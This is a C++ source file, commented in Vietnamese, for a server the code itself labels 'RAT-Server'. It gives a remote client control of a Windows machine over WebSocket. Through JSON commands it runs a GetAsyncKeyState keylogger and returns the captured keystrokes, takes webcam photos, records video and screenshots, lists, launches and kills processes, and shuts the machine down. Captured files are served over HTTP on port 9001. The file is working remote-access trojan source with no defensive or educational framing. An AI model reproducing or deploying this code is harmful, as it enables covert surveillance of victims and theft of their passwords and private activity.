#include <nlohmann/json.hpp> 

////HEADERS (remember to link cpp files before run)
#include "Headers/shutdown.h"
#include "Headers/keylogger.h"
#include "Headers/webcam.h"
#include "Headers/apps.h"
#include "Headers/processes.h"
#include "Headers/screenshot.h"

#include <boost/beast/core.hpp>
#include <boost/beast/websocket.hpp>
#include <boost/beast/core/tcp_stream.hpp>
#include <boost/beast/http/file_body.hpp>
#include <boost/beast/http/read.hpp>
#include <boost/asio/strand.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <boost/asio/steady_timer.hpp>
#include <algorithm>
#include <cstdlib>
#include <functional>
#include <iostream>
#include <memory>
#include <string>
#include <sstream>
#include <thread>
#include <random>
#include <fstream>
#include <vector>




//------------------------------------------------------------------------------
// Namespaces cho gọn
namespace beast = boost::beast;
namespace websocket = beast::websocket;
namespace net = boost::asio;
using tcp = boost::asio::ip::tcp;
using json = nlohmann::json;
namespace http = beast::http; // Thêm namespace http

//------------------------------------------------------------------------------

/**
 * @brief Hàm kiểm tra chuỗi kết thúc bằng đuôi nào đó (thay thế cho ends_with C++20)
 */
bool string_ends_with(const std::string& str, const std::string& suffix) {
    return str.size() >= suffix.size() && 
           str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;
}

/**
 * @brief Logic xử lý yêu cầu HTTP GET cho file tĩnh (Ảnh/Video)
 */
void handle_http_file_request(tcp::socket& socket, http::request<http::string_body>& req)
{
    beast::error_code ec;
    std::string file_path_relative;
    std::string content_type;
    std::string target_str = std::string(req.target()); 

    // Kiểm tra đường dẫn /captures/
    bool starts_with_captures = target_str.find("/captures/") == 0;

    // Chỉ phục vụ các yêu cầu GET và cho thư mục /captures
    if (req.method() == http::verb::get && starts_with_captures) {
        file_path_relative = target_str.substr(1); // Bỏ qua '/' đầu tiên

        // Xác định Content Type
        if (string_ends_with(file_path_relative, ".jpg") || string_ends_with(file_path_relative, ".jpeg")) {
            content_type = "image/jpeg";
        } else if (string_ends_with(file_path_relative, ".mp4")) {
            content_type = "video/mp4";
        } else if (string_ends_with(file_path_relative, ".png")) {
            content_type = "image/png";
        } else {
            // Định dạng không được hỗ trợ
            http::response<http::empty_body> res{http::status::bad_request, req.version()};
            res.set(http::field::server, "RAT-Server");
            res.prepare_payload();
            http::write(socket, res, ec);
            return;
        }

        // Kiểm tra file tồn tại
        std::ifstream file_check(file_path_relative, std::ios::binary | std::ios::ate);
        if (!file_check.is_open()) {
            std::cerr << "[HTTP] File not found: " << file_path_relative << std::endl;
            http::response<http::string_body> res{http::status::not_found, req.version()};
            res.set(http::field::server, "RAT-Server");
            res.set(http::field::content_type, "text/plain");
            res.body() = "404 Not Found";
            res.prepare_payload();
            http::write(socket, res, ec);
            return;
        }
        file_check.close();

        // Gửi file
        http::response<http::file_body> res{http::status::ok, req.version()};
        res.set(http::field::server, "RAT-Server");
        res.set(http::field::content_type, content_type);
        res.keep_alive(req.keep_alive());
        
        res.body().open(file_path_relative.c_str(), beast::file_mode::read, ec);
        
        if (ec) {
             http::response<http::string_body> res_err{http::status::internal_server_error, req.version()};
             res_err.body() = "500 File Open Error";
             res_err.prepare_payload();
             http::write(socket, res_err, ec);
             return;
        }

        res.content_length(res.body().size()); 
        res.prepare_payload();

        std::cout << "[HTTP] Serving file: " << file_path_relative << std::endl;
        http::write(socket, res, ec);
        
    } else {
        // 403 Forbidden cho các request khác
        http::response<http::empty_body> res{http::status::forbidden, req.version()};
        res.set(http::field::server, "RAT-Server");
        res.prepare_payload();
        http::write(socket, res, ec);
    }
}


/**
 * @brief Đại diện cho MỘT kết nối WebSocket của client
 */
class WebsocketSession : public std::enable_shared_from_this<WebsocketSession>
{
    websocket::stream<beast::tcp_stream> ws_;
    beast::flat_buffer buffer_;

    net::strand<net::io_context::executor_type> strand_;

    std::vector<std::shared_ptr<std::string const>> queue_;

    // Keylogger
    bool key_state_[255] = {false};
    std::atomic<bool> is_logging_{false}; 
    std::thread keylogger_thread_; 
    std::string accumulated_log_; 
    std::mutex log_mutex_; 

public:
    WebsocketSession(tcp::socket&& socket)
        : ws_(std::move(socket)), 
          strand_(static_cast<net::io_context&>(ws_.get_executor().context()).get_executor())
    {}
    ~WebsocketSession()
    {
        if (keylogger_thread_.joinable()) {
            is_logging_.store(false); 
            keylogger_thread_.join();
            std::cout << "[Keylogger] Cleaned up thread on session end." << std::endl;
        }
    }
    void run(http::request<http::string_body> req){
        ws_.set_option(
            websocket::stream_base::timeout::suggested(
                beast::role_type::server));

        beast::get_lowest_layer(ws_).expires_after(std::chrono::seconds(15));

        // Chấp nhận handshake từ request có sẵn
        ws_.async_accept(
            req, 
            net::bind_executor(
                strand_,
                std::bind(
                    &WebsocketSession::on_accept,
                    shared_from_this(),
                    std::placeholders::_1)));
    }

    void send(std::shared_ptr<std::string const> const& ss)
    {
        net::post(
            strand_,
            std::bind(
                &WebsocketSession::on_send,
                shared_from_this(),
                ss));
    }
    bool is_open() const {
        return ws_.is_open(); 
    }

private:
    void on_accept(beast::error_code ec)
    {
        if (ec) {
            std::cerr << "[Session] Accept error: " << ec.message() << std::endl;
            return;
        }
        std::cout << "[Session] Client connected." << std::endl;

        beast::get_lowest_layer(ws_).expires_never();
 
        
        do_read();
    }
    

    // ----------------------------------------------------
    void keylogger_loop(){
        std::this_thread::sleep_for(std::chrono::milliseconds(100)); 
        
        while (is_logging_.load()) 
        {
            std::this_thread::sleep_for(std::chrono::milliseconds(10)); 

            std::string current_keys;
            for (int key = 1; key <= 254; key++)
            {
                short key_status = GetAsyncKeyState(key);
                
                if (key_status & 0x8000) 
                {
                    if (!key_state_[key]) {
                        std::string ansi_key = LogKey(key); 
                        std::string utf8_key = AnsiToUtf8(ansi_key); 
                        current_keys += utf8_key; 
                        key_state_[key] = true;
                    }
                }else{
                    if (key_state_[key]){
                        key_state_[key] = false;
                    }
                }
            }

            if (!current_keys.empty()) {
                std::lock_guard<std::mutex> lock(log_mutex_);
                accumulated_log_ += current_keys;
            }
        }
        std::cout << "[Keylogger] Loop finished." << std::endl;
    } 

    void do_read()
    {
        ws_.async_read(
            buffer_,
            net::bind_executor(
                strand_,
                std::bind(
                    &WebsocketSession::on_read,
                    shared_from_this(),
                    std::placeholders::_1,
                    std::placeholders::_2)));
    }

    void on_read(beast::error_code ec, std::size_t bytes_transferred)
    {
        boost::ignore_unused(bytes_transferred);

        if (ec == websocket::error::closed || ec == net::error::eof) {
            std::cout << "[Session] Connection closed by client." << std::endl;
            return;
        }

        if (ec) {
            std::cerr << "[Session] Read error: " << ec.message() << std::endl;
            return;
        }
        
        // ------------------------------------------------------------------
        // LOGIC XỬ LÝ TIN NHẮN ĐẾN TỪ CLIENT (MỚI)
        // ------------------------------------------------------------------
        
        std::string message = beast::buffers_to_string(buffer_.data());

        std::cout << "[Client] Received: " << message << std::endl;

        try {
            json j = json::parse(message);

            if (!j.is_object() || !j.count("command") || !j["command"].is_string()) {
                std::cerr << "!!! SERVER WARNING: Invalid JSON format or missing command." << std::endl;
                buffer_.consume(buffer_.size());
                do_read(); 
                return;
            }
            
            std::string command = j["command"].get<std::string>();
            json response_json;
            std::string file_path;

            if (command == "shutdown"){
                shutdown();
            }
            else if (command == "keylogger_start") {
                if (is_logging_.load() == false) {
                    {
                        std::lock_guard<std::mutex> lock(log_mutex_);
                        accumulated_log_.clear();
                    }
                    is_logging_.store(true);
                    
                    keylogger_thread_ = std::thread(&WebsocketSession::keylogger_loop, shared_from_this());
                    std::cout << "[Keylogger] Started logging." << std::endl;
                } else {
                    std::cout << "[Keylogger] Already running." << std::endl;
                }
            }
            else if (command == "keylogger_stop") {
                if (is_logging_.load() == true) {
                    is_logging_.store(false); 
                    if (keylogger_thread_.joinable()) {
                        keylogger_thread_.join(); 
                    }

                    std::string final_log;
                    {
                        std::lock_guard<std::mutex> lock(log_mutex_);
                        final_log = accumulated_log_;
                        accumulated_log_.clear(); 
                    }
                    
                    std::string key_log_string = "--- TOAN BO CHUOI LOG ---\n";
                    key_log_string += final_log;
                    key_log_string += "\n---------------------------\n";

                    response_json = {
                        {"command", "keylogger_log"},
                        {"payload", key_log_string}
                    };
                    std::cout << "[Keylogger] Log collected and sending..." << std::endl;
                    send(std::make_shared<std::string const>(response_json.dump()));
                } else {
                    std::cout << "[Keylogger] Not currently running." << std::endl;
                }
            }
            else if (command == "webcam_capture"){
                file_path = capture();
                
                if (!file_path.empty()) {
                    response_json = {
                        {"command", "webcam_capture"}, 
                        {"payload",  file_path} 
                    };
                    std::cout << "[Webcam] Picture taken and sending path: " << file_path << std::endl;
                    send(std::make_shared<std::string const>(response_json.dump()));
                } else {
                    response_json = {{"command", "error"}, {"payload", "Webcam capture failed."}};
                    send(std::make_shared<std::string const>(response_json.dump()));
                }
            }
            else if(command == "webcam_record"){
                double sec_record = (j.count("payload") && j["payload"].count("duration")) ? j["payload"]["duration"].get<double>() : 5.0;
                
                file_path = record(sec_record);
                
                if (!file_path.empty()) {
                    response_json = {
                        {"command", "webcam_record"}, 
                        {"payload", file_path}
                    };
                    std::cout << "[Webcam] Video taken and sending path: " << file_path << std::endl;
                    send(std::make_shared<std::string const>(response_json.dump()));
                } else {
                    response_json = {{"command", "error"}, {"payload", "Webcam recording failed."}};
                    send(std::make_shared<std::string const>(response_json.dump()));
                }
            }
            else if (command == "http_request") {
                // Dấu hiệu nhận biết: request không phải WS mà là HTTP
                std::cout << "[HTTP] Received non-WS request. Ignoring in WS session." << std::endl;
            }
            // ----- Mới
            // 1. MÀN HÌNH (Khớp lệnh "screen_capture" của Client)
            // ----------------------------------------------------
            else if (command == "screen_capture") {
                // Giả sử hàm captureScreen() vẫn trả về string path như cũ
                file_path = captureScreen(); 
                if (!file_path.empty()) {
                    response_json = {
                        {"command", "screen_capture"}, // Client đợi lệnh này để showImageModal
                        {"payload", file_path}
                    };
                    send(std::make_shared<std::string const>(response_json.dump()));
                }
            }

            // ----------------------------------------------------
            // 2. DANH SÁCH APPS (Khớp lệnh "list_apps")
            // ----------------------------------------------------
            else if (command == "list_apps") {
                json list = listApps(); // Hàm này giờ trả về JSON Array
                response_json = {
                    {"command", "list_apps"}, 
                    {"payload", list} // Gửi nguyên mảng JSON về cho showTableModal
                };
                send(std::make_shared<std::string const>(response_json.dump()));
            }

            // ----------------------------------------------------
            // 3. MỞ APP (Khớp lệnh "start_app", payload: {name: "..."})
            // ----------------------------------------------------
            else if (command == "start_app") {
                std::string appName = "";
                // Client gửi: { command: "start_app", payload: { name: "notepad" } }
                if (j.count("payload") && j["payload"].is_object() && j["payload"].count("name")) {
                    appName = j["payload"]["name"].get<std::string>();
                }

                if (!appName.empty() && startApp(appName)) {
                    response_json = {{"command", "info"}, {"payload", "Đã mở App: " + appName}};
                } else {
                    response_json = {{"command", "error"}, {"payload", "Lỗi mở App (hoặc tên trống)."}};
                }
                send(std::make_shared<std::string const>(response_json.dump()));
            }

            // ----------------------------------------------------
            // 4. ĐÓNG APP (Khớp lệnh "stop_app", payload: {id: "..."})
            // ----------------------------------------------------
            else if (command == "stop_app") {
                int pid = 0;
                std::string input = "";

                // Lấy dữ liệu gửi lên (có thể là số PID "1234" hoặc tên "notepad")
                if (j.count("payload") && j["payload"].is_object() && j["payload"].count("id")) {
                     input = j["payload"]["id"].get<std::string>();
                }

                // Kiểm tra xem input là SỐ hay CHỮ
                bool isNumber = !input.empty() && std::all_of(input.begin(), input.end(), ::isdigit);

                if (isNumber) {
                    // Nếu là số -> Chuyển thành int
                    try { pid = std::stoi(input); } catch(...) { pid = 0; }
                } else {
                    // Nếu là chữ -> Dùng hàm tìm kiếm thông minh
                    pid = getAppPIDByName(input);
                    std::cout << "[Apps] Smart Search: '" << input << "' -> PID: " << pid << std::endl;
                }

                if (pid > 0 && killAppByID(pid)) {
                     response_json = {{"command", "info"}, {"payload", "Đã đóng App (" + input + ") - PID: " + std::to_string(pid)}};
                } else {
                     response_json = {{"command", "error"}, {"payload", "Không tìm thấy App: " + input}};
                }
                send(std::make_shared<std::string const>(response_json.dump()));
            }

            // ----------------------------------------------------
            // 5. DANH SÁCH PROCESS (Khớp lệnh "list_processes")
            // ----------------------------------------------------
            else if (command == "list_processes") {
                json list = listProcesses();
                response_json = {
                    {"command", "list_processes"},
                    {"payload", list}
                };
                send(std::make_shared<std::string const>(response_json.dump()));
            }

            // ----------------------------------------------------
            // 6. CHẠY PROCESS (Khớp lệnh "start_process")
            // ----------------------------------------------------
            else if (command == "start_process") {
                std::string procName = "";
                if (j.count("payload") && j["payload"].is_object() && j["payload"].count("name")) {
                    procName = j["payload"]["name"].get<std::string>();
                }
                
                // Tận dụng hàm startApp vì cơ chế giống nhau
                if (!procName.empty() && startApp(procName)) {
                    response_json = {{"command", "info"}, {"payload", "Đã chạy Process: " + procName}};
                } else {
                    response_json = {{"command", "error"}, {"payload", "Lỗi chạy Process."}};
                }
                send(std::make_shared<std::string const>(response_json.dump()));
            }

            // ----------------------------------------------------
            // 7. DIỆT PROCESS (Khớp lệnh "stop_process")
            // ----------------------------------------------------
            else if (command == "stop_process") {
                int pid = 0;
                std::string input = "";

                if (j.count("payload") && j["payload"].is_object() && j["payload"].count("id")) {
                     input = j["payload"]["id"].get<std::string>();
                }

                // Logic tương tự: Check số hay chữ
                bool isNumber = !input.empty() && std::all_of(input.begin(), input.end(), ::isdigit);

                if (isNumber) {
                    try { pid = std::stoi(input); } catch(...) { pid = 0; }
                } else {
                    // Tìm PID theo tên process
                    pid = getProcessPIDByName(input);
                    std::cout << "[Process] Smart Search: '" << input << "' -> PID: " << pid << std::endl;
                }

                if (pid > 0 && killProcessByID(pid)) {
                     response_json = {{"command", "info"}, {"payload", "Đã diệt Process (" + input + ") - PID: " + std::to_string(pid)}};
                } else {
                     response_json = {{"command", "error"}, {"payload", "Không tìm thấy Process: " + input}};
                }
                send(std::make_shared<std::string const>(response_json.dump()));
            }
            // ------ 
            // ------------------------------------------------------------------
        } catch (const json::parse_error& e) {
            std::cerr << "!!! SERVER ERROR: Lỗi JSON: " << e.what() << std::endl;
        } catch (const std::exception& e) {
            std::cerr << "!!! SERVER ERROR: Lỗi xử lý tin nhắn: " << e.what() << std::endl;
        }
        // ------------------------------------------------------------------
        // Xóa buffer và tiếp tục đọc
        buffer_.consume(buffer_.size());
        do_read(); // Tiếp tục vòng lặp đọc

    }


    void on_send(std::shared_ptr<std::string const> const& ss)
    {
        queue_.push_back(ss);
        if (queue_.size() > 1)
            return;

        ws_.async_write(
            net::buffer(*queue_.front()),
            net::bind_executor(
                strand_,
                std::bind(
                    &WebsocketSession::on_write,
                    shared_from_this(),
                    std::placeholders::_1,
                    std::placeholders::_2)));
    }

    void on_write(beast::error_code ec, std::size_t bytes_transferred)
    {
        boost::ignore_unused(bytes_transferred);
        
        if (ec) {
            std::cerr << "[Session] Write error: " << ec.message() << std::endl;
            return;
        }

        queue_.erase(queue_.begin());

        if (!queue_.empty()) {
            ws_.async_write(
                net::buffer(*queue_.front()),
                net::bind_executor(
                    strand_,
                    std::bind(
                        &WebsocketSession::on_write,
                        shared_from_this(),
                        std::placeholders::_1,
                        std::placeholders::_2)));
        }
    }
};




/**
 * @brief Lắng nghe các kết nối TCP đến (đã đơn giản hóa)
 * QUAN TRỌNG: Phải xử lý HTTP và WebSocket trên cùng một cổng.
 */
class Listener : public std::enable_shared_from_this<Listener>
{
    net::io_context& ioc_;
    tcp::acceptor acceptor_;
    
    std::shared_ptr<WebsocketSession> active_ws_session_; 

public:
    Listener(
        net::io_context& ioc,
        tcp::endpoint endpoint)
        : ioc_(ioc),
          acceptor_(ioc)
    {
        beast::error_code ec;

        acceptor_.open(endpoint.protocol(), ec);
        if (ec) { 
        std::cerr << "[Listener::ctor] Open error: " << ec.message() << std::endl; 
        throw std::runtime_error("Listener failed to open."); 
        }
        acceptor_.set_option(net::socket_base::reuse_address(true), ec);
        if (ec) { 
            std::cerr << "[Listener::ctor] Set option error: " << ec.message() << std::endl; 
            throw std::runtime_error("Listener failed to set option.");
        }
        acceptor_.bind(endpoint, ec);
        if (ec) { 
            std::cerr << "[Listener::ctor] Bind error: " << ec.message() << std::endl; 
            throw std::runtime_error("Listener failed to bind.");
        }
        acceptor_.listen(net::socket_base::max_listen_connections, ec);
        if (ec) { 
            std::cerr << "[Listener::ctor] Listen error: " << ec.message() << std::endl; 
            throw std::runtime_error("Listener failed to listen.");
        }
    }

    void run()
    {
        do_accept();
    }

private:
    void do_accept()
    {
        // Chấp nhận một socket mới
        acceptor_.async_accept(
            beast::bind_front_handler(
                &Listener::on_accept,
                shared_from_this()));
    }

    void on_accept(beast::error_code ec, tcp::socket socket)
    {
        if (ec) {
            std::cerr << "[Listener] Accept error: " << ec.message() << std::endl;
            do_accept();
            return;
        }

        // 1. Đọc Header của request để phân loại
        beast::flat_buffer buffer;
        http::request<http::string_body> req;
        
        // Đọc đồng bộ (synchronous) để đơn giản hóa việc phân loại ban đầu
        // Lưu ý: Trong production tải cao, nên dùng async_read nhưng ở đây dùng sync cho gọn code
        http::read(socket, buffer, req, ec);

        if (ec) {
            if (ec != http::error::end_of_stream)
                std::cerr << "[Listener] Initial read error: " << ec.message() << std::endl;
            socket.close(ec);
            do_accept();
            return;
        }

        // 2. Kiểm tra xem đây là WebSocket Upgrade hay HTTP thường
        if (websocket::is_upgrade(req)) 
        {
            // --- XỬ LÝ WEBSOCKET ---
            
            // Dọn dẹp session cũ nếu đã chết
            if (active_ws_session_ && !active_ws_session_->is_open()) {
                active_ws_session_.reset();
            }

            if (!active_ws_session_) {
                std::cout << "[Listener] WebSocket Upgrade Detected -> Starting Session." << std::endl;
                
                // Tạo session mới và chuyển socket vào
                active_ws_session_ = std::make_shared<WebsocketSession>(std::move(socket));
                
                // Gọi hàm run() phiên bản nhận request để hoàn tất handshake
                active_ws_session_->run(std::move(req)); 
            } else {
                std::cerr << "[Listener] WS Connection refused: Busy." << std::endl;
                // Gửi phản hồi lỗi 503 Service Unavailable
                http::response<http::string_body> res{http::status::service_unavailable, req.version()};
                res.set(http::field::server, "RAT-Server");
                res.body() = "Server is busy with another client.";
                res.prepare_payload();
                http::write(socket, res, ec);
            }
        } 
        else 
        {
            // --- XỬ LÝ HTTP THƯỜNG (File Transfer) ---
            // Gọi hàm xử lý file, truyền socket và request đã đọc
            handle_http_file_request(socket, req);
            
            // Sau khi gửi file xong, socket thường sẽ đóng hoặc giữ alive tùy logic, 
            // nhưng ở đây ta để handle_http_file_request tự xử lý xong rồi thoát scope.
            // Nếu không keep-alive, ta có thể shutdown tại đây:
            socket.shutdown(tcp::socket::shutdown_send, ec);
        }

        // Tiếp tục lắng nghe kết nối mới
        do_accept();
    }
};

//------------------------------------------------------------------------------
// HÀM MAIN
//------------------------------------------------------------------------------
int main(int argc, char* argv[])
{
    // Cấu hình mặc định
    auto const address = net::ip::make_address("0.0.0.0");
    auto const port = static_cast<unsigned short>(9001);
    auto const threads = std::max<int>(1, std::thread::hardware_concurrency());

    std::cout << "Starting Single-Client WebSocket/HTTP Server..." << std::endl;
    std::cout << "Address: " << address.to_string() << std::endl;
    std::cout << "Port: " << port << std::endl;
    std::cout << "Threads: " << threads << std::endl;

    net::io_context ioc{threads};

    try {
        std::make_shared<Listener>(
            ioc,
            tcp::endpoint{address, port})
            ->run();

        // Chạy io_context trên một nhóm thread
        std::vector<std::thread> v;
        v.reserve(threads - 1);
        for (auto i = threads - 1; i > 0; --i) {
            v.emplace_back([&ioc] {
                ioc.run();
            });
        }

        ioc.run();

        for (auto& t : v) {
            t.join();
        }
    } catch (const std::exception& e) {
        std::cerr << "Fatal Error: " << e.what() << std::endl;
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}